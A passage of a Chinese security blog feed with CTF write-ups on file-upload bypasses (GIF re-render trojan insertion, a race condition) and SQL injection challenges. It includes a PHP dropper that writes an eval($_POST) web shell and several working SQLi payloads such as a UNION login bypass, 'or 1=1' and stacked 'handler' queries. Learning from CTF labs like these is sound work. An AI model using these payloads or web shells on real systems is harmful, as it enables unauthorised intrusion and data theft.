class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;               <br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((<span class="hljs-variable">$fileext</span> == <span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; (<span class="hljs-variable">$filetype</span>==<span class="hljs-string">&quot;image/gif&quot;</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmpname</span>,<span class="hljs-variable">$target_path</span>))&#123;<br>            <span class="hljs-comment">//使用上传的图片生成新的图片</span><br>            <span class="hljs-variable">$im</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$target_path</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$im</span> == <span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;该文件不是gif格式的图片！&quot;</span>;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//给新图片指定文件名</span><br>                <span class="hljs-title function_ invoke__">srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br>                <span class="hljs-variable">$newfilename</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">rand</span>()).<span class="hljs-string">&quot;.gif&quot;</span>;<br>                <span class="hljs-comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$newfilename</span>;<br>                <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$im</span>,<span class="hljs-variable">$img_path</span>);<br><br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$target_path</span>);<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>本题<code>basename()</code>函数用于返回文件路径中文件名部分的函数</p><p><code>imagecreatefromgif()</code>创建一块画布，从gif地址加载gif图片；</p><p>然后经过二次渲染显示出来</p><p>原理是上传一张图片，然后再把图片下载下来，对比前后图片的十六进制码，(头部除外)，对比前后hex码相同的位置，然后在其中插入木马，比如说这张gif(一般gif会比较容易插入)</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/test.gif"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011352229.png"></p><p>然后修改这部分</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011748800.png"></p><p>得到：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/test-1691601488206-3.gif"></p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810011956749.png"></p><h3 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h3><p>本题考察条件竞争：<br>看一眼源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             <span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用文件名截取的方式来获取后缀，真就非图片后缀不可了？如果有文件包含漏洞还可以上传图片马，可是这道题并没有提供文件包含漏洞的。再看一眼源代码，可以看见如果错误文件上传后，其实是已经上传进服务器了的，但是之后如果不满足后缀就直接删除，服务器的一切行为都需要时间，如果我可以在服务器将文件删除之前，访问一个可以创建新文件的文件，那新文件一旦创建不是就不会被删除了吗？这就是条件竞争，在服务器没来得及删除文件之前先访问文件</p><p>这里使用<code>fwrite()</code>函数写入文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将上述代码重命名为jz.php</p><p>bp抓包：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810022920827.png"></p><p>丢到爆破区，然后clear掉所有的爆破点，主要是为了不断上传文件</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810023105203.png"></p><p>payload设置为空，不受限发包：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810023247221.png"></p><p>线程数调高点：</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810025018910.png"></p><p>然后就开始攻击，不断重发包<img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810121052870.png"></p><p>同样的方法不断访问该文件</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810142511762.png"></p><p>直到状态码出现200，就说明访问成功了，也就生成了shell.php</p><p><img src="/2023/02/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20230810142757428.png"></p><h3 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h3>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLI</title>
    <link href="/2023/02/09/SQLI/"/>
    <url>/2023/02/09/SQLI/</url>
    
    <content type="html"><![CDATA[<h2 id="CTF-After-Dark-Injection-Perfection"><a href="#CTF-After-Dark-Injection-Perfection" class="headerlink" title="CTF After Dark-Injection Perfection"></a>CTF After Dark-Injection Perfection</h2><p>因为想起来要把这道题收进来的时候网站已经关闭了（悲，所以没法复现题目环境，题目的页面就是一般的登录页面，用户名，密码，提交，题目要求使用admin账户登录。还好赛题部分源码还能下载。这是app.js内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><br><span class="hljs-keyword">const</span> port = <span class="hljs-built_in">parseInt</span>(process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span>) || <span class="hljs-number">8080</span>;<br><br><span class="hljs-keyword">const</span> sqlite3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sqlite3&#x27;</span>);<br><span class="hljs-keyword">const</span> db = <span class="hljs-keyword">new</span> sqlite3.<span class="hljs-title class_">Database</span>(<span class="hljs-string">&#x27;app.db&#x27;</span>, sqlite3.<span class="hljs-property">OPEN_READONLY</span>);<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> upload = <span class="hljs-title function_">multer</span>();<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(upload.<span class="hljs-title function_">array</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>));<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getFavColor</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">username</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT fav_color FROM users WHERE username=?&#x27;</span>, username, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(err);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(row.<span class="hljs-property">fav_color</span>);<br>&#125;);<br>&#125;);<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">attemptLogin</span> = (<span class="hljs-params">username, password</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">`SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="hljs-keyword">async</span> (err, row) =&gt; &#123;<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (row === <span class="hljs-literal">undefined</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;Invalid User&#x27;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password === row.<span class="hljs-property">password</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`My favorite color is <span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> getFavColor(row.username)&#125;</span>`</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;incorrect password&#x27;</span>);<br>&#125;);<br>&#125;)<br>&#125;;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;login.html&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br><span class="hljs-keyword">const</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;<br><span class="hljs-keyword">const</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span>;<br><br><span class="hljs-keyword">if</span> (!username || !password)<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Invalid Login&quot;</span>);<br><br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">send</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">attemptLogin</span>(username, password));<br>&#125; <span class="hljs-keyword">catch</span> (err) &#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(err);<br>&#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;not found&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>);<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>本题重点在第29行这个回调函数，从数据库调数据与用户输入进行比对，那就看看这个后端判断登录的逻辑是什么样的吧：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">db.<span class="hljs-title function_">get</span>(<span class="hljs-string">`SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="hljs-keyword">async</span> (err, row) =&gt; &#123;<br><span class="hljs-keyword">if</span> (err)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(err);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (row === <span class="hljs-literal">undefined</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;Invalid User&#x27;</span>);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (password === row.<span class="hljs-property">password</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">`My favorite color is <span class="hljs-subst">$&#123;<span class="hljs-keyword">await</span> getFavColor(row.username)&#125;</span>`</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-string">&#x27;incorrect password&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>显然如果存在sql注入的话<code>username</code>将会是注入点，可以看出逻辑为：</p><p>从数据库的<code>users</code>表查名为用户输入的<code>username</code>的行中的<code>username</code>和<code>password</code>字段，将结果存入<code>row</code>数组中，如果用户输入的<code>password</code>等于数据库查到的<code>row.password</code>，也就是登陆成功，则执行一个<code>getFavColor()</code>方法</p><p>getFavColor():</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getFavColor</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">username</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT fav_color FROM users WHERE username=?&#x27;</span>, username, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(err);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(row.<span class="hljs-property">fav_color</span>);<br>&#125;);<br>&#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>大概users里存着三个字段：username、password、fav_color。<code>getColor()</code>方法是当用户登陆成功后查询登录账户最喜欢的颜色并返回，题目要求使用admin登录，盲猜admin最喜欢的颜色就是flag啦（。</p><p>再回到登录验证部分。那么怎么样才能输入用户名”admin”，然后输入密码对应的是”admin”对应的密码呢？一开始陷入了这个思维陷阱没跳出来，实际上，可以这样：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">username:*&#x27; UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;123&quot;</span><span class="hljs-comment">--+</span><br>password:<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>用户名中的”*”指的是一个数据库中不存在的用户名，空着也行，然后单引号闭合。SELECT “admin” 和 “123”，最后”–+”闭合语句，这样一来整个sql语句的查询结果就变成了</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>admin</td><td>123</td></tr></tbody></table><p>那么当用户输入密码为”123”自然就等于row.password了，登陆成功。</p><p>为便于理解，我们本地创建一个表<code>user_info</code>，表如下：</p><p><img src="/2023/02/09/SQLI/image-20230412122726143.png"></p><p>本地测试结果如下：</p><p><img src="/2023/02/09/SQLI/image-20230412123052991.png"></p><p>表中不存在”21112”的用户，因此此处无查询结果，联合查询利用select直接返回字符串。如果username填入已有用户，查询结果如下：</p><p><img src="/2023/02/09/SQLI/image-20230412123949128.png"></p><p>当然，要学会善于利用工具（，话不多说，上图</p><p><img src="/2023/02/09/SQLI/B041239C46DBC25E5C1727ACF80014FC.jpg"></p><p>这道题用sqlmap也能直接淦出来。厚礼蟹</p><hr><h2 id="BUUCTF-EasySql"><a href="#BUUCTF-EasySql" class="headerlink" title="BUUCTF-EasySql"></a>BUUCTF-EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p><p><img src="/2023/02/09/SQLI/image-20230213012236141.png"></p><p>密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。</p><p><img src="/2023/02/09/SQLI/image-20230213013114976.png"></p><p>准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。</p><p><img src="/2023/02/09/SQLI/image-20230213013848916.png"></p><p>题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*<strong>导致后端查询语句变成</strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’  or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分：</p><p><em><strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’</strong></em> 和</p><p><em><strong>or (ascii(substr(database(),0,1))&lt;128)#’</strong></em></p><p>虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag；</p><p>但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1&#x3D;1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。</p><hr><h2 id="BUUCTF-easy-sql"><a href="#BUUCTF-easy-sql" class="headerlink" title="BUUCTF-easy_sql"></a>BUUCTF-easy_sql</h2><p>先传入1，返回一个字符串，传入1’，报错</p><p><img src="/2023/02/09/SQLI/image-20230213133221152.png"></p><p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/02/09/SQLI/image-20230213140043405.png"></p><p>传入***’ order by 3#<em><strong>，报错。传入</strong></em>‘ order by 2#***不报错，判断表里有2个字段。</p><p><img src="/2023/02/09/SQLI/image-20230213140715876.png"></p><p>联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">//依次将s改为e,l,e,c,t</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>)==<span class="hljs-variable">$var</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;^&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>得到select，尝试能否绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;.&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;1&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%3C&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%2B&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还是没绕过，暂时放弃这条路。</p><p><img src="/2023/02/09/SQLI/image-20230213143545653.png"></p><p>查找学习show databases爆数据库名。<img src="/2023/02/09/SQLI/image-20230213144232143.png"></p><p>show tables爆表名，好臭的表名啊(。</p><p><img src="/2023/02/09/SQLI/image-20230213144433988.png"></p><p>‘; show columns from <code>1919810931114514</code>;#爆字段名（表名要用反引号引起来，typora里不知道为什么吞反引号）</p><p><img src="/2023/02/09/SQLI/image-20230213144916052.png"></p><p>万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] open;#打开表（句柄）<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] read first;#从表的第一列开始读（指针的起点）<br>handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137）<br></code></pre></td></tr></table></figure><p>最终构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213152804918.png"></p><p>拿到flag。</p><p>反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。</p><p>预编译相关语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set : #设置变量；<br>prepare : #准备一个语句赋予其名称，之后直接调用语句；<br>execute :#执行语句；<br></code></pre></td></tr></table></figure><p>以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。</p><p>步骤如下：</p><figure class="highlight plaintext"><table><tr><td 